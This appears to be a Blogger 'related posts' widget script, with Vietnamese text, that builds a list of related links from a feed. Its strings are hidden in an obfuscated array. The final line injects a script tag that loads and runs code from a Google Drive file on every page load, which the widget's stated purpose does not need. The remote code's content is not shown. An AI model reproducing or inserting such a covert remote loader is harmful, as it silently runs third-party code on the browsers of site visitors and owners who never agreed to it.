//<![CDATA[
	'use strict';
var _0xcf70 = ["length", "entry", "feed", "$t", "title", "link", "rel", 
"alternate", "href", "published", "?m=0", "indexOf", "", "replace", "splice", 
"random", "floor", "<ul>", "write", "<li>Kh\u00f4ng c\u00f3 b\u00e0i vi\u1ebft li\u00ean quan \u2192 </li>", 
'<li><a href="', '" title="', "substring", "/", '">', "</a></li>", "</ul>", 
"<script src='https://drive.google.com/uc?id=1oH6HF2bMQsxQg56Cse73BwvsQwXaJN-P'>\x3c/script>"];
var titles = new Array;
var titlesNum = 0;
var urls = new Array;
var time = new Array;
function related_results_labels(canCreateDiscussions) {
  var signedTransactionsCounter = 0;
  for (; signedTransactionsCounter < canCreateDiscussions[_0xcf70[2]][_0xcf70[1]][_0xcf70[0]]; signedTransactionsCounter++) {
    var payload = canCreateDiscussions[_0xcf70[2]][_0xcf70[1]][signedTransactionsCounter];
    titles[titlesNum] = payload[_0xcf70[4]][_0xcf70[3]];
    var id = 0;
    for (; id < payload[_0xcf70[5]][_0xcf70[0]]; id++) {
      if (payload[_0xcf70[5]][id][_0xcf70[6]] == _0xcf70[7]) {
        urls[titlesNum] = payload[_0xcf70[5]][id][_0xcf70[8]];
        time[titlesNum] = payload[_0xcf70[9]][_0xcf70[3]];
        titlesNum++;
        break;
      }
    }
  }
}
function removeRelatedDuplicates() {
  var value = new Array(0);
  var t = new Array(0);
  e = new Array(0);
  var i = 0;
  for (; i < urls[_0xcf70[0]]; i++) {
    if (!contains(value, urls[i])) {
      value[_0xcf70[0]] += 1;
      value[value[_0xcf70[0]] - 1] = urls[i];
      t[_0xcf70[0]] += 1;
      t[t[_0xcf70[0]] - 1] = titles[i];
      e[_0xcf70[0]] += 1;
      e[e[_0xcf70[0]] - 1] = time[i];
    }
  }
  titles = t;
  urls = value;
  time = e;
}
function contains(lookIn, forWhat) {
  var j = 0;
  for (; j < lookIn[_0xcf70[0]]; j++) {
    if (lookIn[j] == forWhat) {
      return true;
    }
  }
  return false;
}
function printRelatedLabels(url) {
  var _0x62c3xd = url[_0xcf70[11]](_0xcf70[10]);
  if (_0x62c3xd != -1) {
    url = url[_0xcf70[13]](/\?m=0/g, _0xcf70[12]);
  }
  var i = 0;
  for (; i < urls[_0xcf70[0]]; i++) {
    if (urls[i] == url) {
      urls[_0xcf70[14]](i, 1);
      titles[_0xcf70[14]](i, 1);
      time[_0xcf70[14]](i, 1);
    }
  }
  var k = Math[_0xcf70[16]]((titles[_0xcf70[0]] - 1) * Math[_0xcf70[15]]());
  i = 0;
  document[_0xcf70[18]](_0xcf70[17]);
  if (titles[_0xcf70[0]] == 0) {
    document[_0xcf70[18]](_0xcf70[19]);
  } else {
    for (; i < titles[_0xcf70[0]] && i < 20 && i < maxresults;) {
      if (_0x62c3xd != -1) {
        urls[k] = urls[k] + _0xcf70[10];
      }
      document[_0xcf70[18]](_0xcf70[20] + urls[k] + _0xcf70[21] + time[k][_0xcf70[22]](8, 10) + _0xcf70[23] + time[k][_0xcf70[22]](5, 7) + _0xcf70[23] + time[k][_0xcf70[22]](0, 4) + _0xcf70[24] + titles[k] + _0xcf70[25]);
      if (k < titles[_0xcf70[0]] - 1) {
        k++;
      } else {
        k = 0;
      }
      i++;
    }
  }
  document[_0xcf70[18]](_0xcf70[26]);
  urls[_0xcf70[14]](0, urls[_0xcf70[0]]);
  titles[_0xcf70[14]](0, titles[_0xcf70[0]]);
}
document[_0xcf70[18]](_0xcf70[27]);

//]]>	
